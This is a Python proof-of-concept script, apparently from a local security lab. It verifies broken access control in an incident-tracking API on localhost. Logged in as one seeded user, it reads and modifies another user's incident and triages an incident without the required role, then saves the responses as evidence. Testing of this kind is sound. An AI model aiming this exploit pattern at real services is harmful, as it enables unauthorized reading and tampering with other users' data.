import os,json,urllib.request,urllib.error,http.cookiejar
from pathlib import Path
base='http://127.0.0.1:5084'
def client():return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
def req(c,method,path,body=None):
 data=None if body is None else json.dumps(body).encode()
 r=urllib.request.Request(base+path,data=data,method=method,headers={'Accept':'application/json','Content-Type':'application/json'})
 try: response=c.open(r)
 except urllib.error.HTTPError as e:response=e
 with response:
  text=response.read().decode(); return {'status':response.status,'body':json.loads(text) if text else None}
a=client();b=client();records={}
for name,c in [('alice',a),('bob',b)]:
 result=req(c,'POST','/api/auth/login',{'userName':name,'password':os.environ['SeedUsers__Password']});assert result['status']==204
 records[name+'_profile']=req(c,'GET','/api/me')
path='/api/incidents/20000000-0000-0000-0000-000000000002'
records['own_read']=req(a,'GET','/api/incidents/20000000-0000-0000-0000-000000000001')
records['foreign_read']=req(a,'GET',path)
records['before']=req(b,'GET',path)
records['foreign_update']=req(a,'PUT',path,{'description':'LOCAL LR04 PoC: unauthorized synthetic modification.'})
records['after']=req(b,'GET',path)
records['reporter_triage']=req(a,'POST','/api/incidents/20000000-0000-0000-0000-000000000003/triage',{'role':'Analyst'})
records['triage_after']=req(a,'GET','/api/incidents/20000000-0000-0000-0000-000000000003')
assert records['foreign_read']['status']==200
assert records['foreign_update']['status']==204
assert records['before']['body']['description']!=records['after']['body']['description']
assert records['triage_after']['body']['status']=='Triaged'
Path(r'C:\dev\lr04-local\vulnerable-evidence.json').write_text(json.dumps(records,ensure_ascii=False,indent=2),encoding='utf-8')
print('Vulnerable PoC verified: own read 200; foreign read 200; foreign update 204 changed state; Reporter triage 204 changed status. Safe evidence saved.')
